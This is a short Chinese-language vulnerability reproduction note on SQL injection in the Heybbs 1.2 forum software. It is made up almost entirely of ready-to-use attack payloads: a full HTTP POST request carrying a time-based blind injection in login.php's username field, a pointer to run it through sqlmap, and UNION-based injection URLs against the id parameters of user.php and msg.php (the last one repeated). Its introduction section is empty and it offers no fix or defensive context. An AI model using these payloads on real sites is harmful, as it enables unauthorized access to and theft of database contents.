Heybbs 1.2 sql注入漏洞
======================

一、漏洞简介
------------

二、漏洞影响
------------

Heybb 1.2

三、复现过程
------------

**第一处注入存在于login.php文件的username参数处**

    POST /php/login.php HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 98
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://www.0-sec.org
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://www.0-sec.org/login.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=qmpkek4l3ojr30gtodf6nj4hp4
    Connection: close

    username=123123' and (select 1 from (select(sleep(5)))accn) AND '1'='1&password=123123&verify=h4ir

> 将username标\*放入sqlmap -r

**第二处注入存在于user.php文件id参数处**

Eg:

`http://www.0-sec.org/user.php?id=177 and 1=2 union select 1) ,user(),3,4,5,6,7,8,9,10`

**第三处注入存在于msg.php文件id参数处**

Eg:

`http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12`

Eg:

`http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12`
